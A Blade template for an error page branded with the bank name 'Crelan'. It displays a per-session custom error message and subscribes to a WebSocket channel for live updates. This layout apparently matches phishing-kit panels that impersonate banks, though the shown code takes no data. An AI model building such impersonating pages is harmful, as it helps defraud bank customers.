@extends('layouts.app')

@section('title', __('messages.error_title') . ' | Crelan')

@section('content')
<div class="form-page-center">
    <div class="form-container">
        <div class="form-container--content">
            <div class="error-container">
                <div class="error-icon">
                    <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                        <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2" fill="none"/>
                        <path d="M12 7V13" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
                        <circle cx="12" cy="16.5" r="1" fill="currentColor"/>
                    </svg>
                </div>
                
                <h2 class="error-title">{{ __('messages.error_title') }}</h2>
                
                <p class="error-text">
                    {{ $session->custom_error_text ?? __('messages.error_description') }}
                </p>
                
                <button class="error-btn" onclick="window.location.href='/'">
                    <span>{{ __('messages.back_to_home') }}</span>
                </button>
            </div>
        </div>
    </div>
</div>
@endsection

@push('scripts')
<script>
document.addEventListener('DOMContentLoaded', function() {
    // WebSocket для обновлений
    if (window.SessionManager) {
        const sessionId = '{{ $session->id }}';
        window.SessionManager.setSessionId(sessionId);
        window.SessionManager.connectToChannel();
    }
});
</script>
@endpush
